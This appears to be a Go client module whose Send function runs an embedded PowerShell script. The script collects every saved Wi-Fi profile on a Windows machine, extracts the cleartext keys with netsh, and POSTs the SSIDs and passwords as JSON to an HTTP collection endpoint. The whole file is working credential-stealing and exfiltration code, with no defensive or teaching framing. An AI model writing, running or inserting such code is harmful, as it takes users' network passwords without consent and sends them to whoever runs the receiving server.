package client

import (
	"bytes"
	"log"
	"os/exec"
)

func Send() {
	// Define the PowerShell command
	cmd := exec.Command("powershell", "-Command", `
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() };
        $wifiProfiles = @();
        foreach ($profile in $profiles) {
            $profileDetails = netsh wlan show profile name="$profile" key=clear;
            $passwordMatch = $profileDetails | Select-String "Key Content";
            if ($passwordMatch) {
                $password = $passwordMatch.ToString().Split(":")[1].Trim();
            } else {
                $password = "No password found";
            }
            $wifiProfiles += [PSCustomObject]@{ SSID = $profile; Password = $password }
        };
        $json = $wifiProfiles | ConvertTo-Json;
        try {
            Invoke-RestMethod -Uri "http://localhost:3000/api/input" -Method Post -Body $json -ContentType "application/json";
        } catch {
            Write-Error "Failed to send data: $_"
        }
    `)

	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	err := cmd.Run()
	if err != nil {
		log.Printf("cmd.Run() failed with %s\n", err)
		log.Printf("Stderr: %s\n", stderr.String())
		return
	}
	log.Printf("Output: %s\n", out.String())
	log.Printf("Error: %s\n", stderr.String())
}
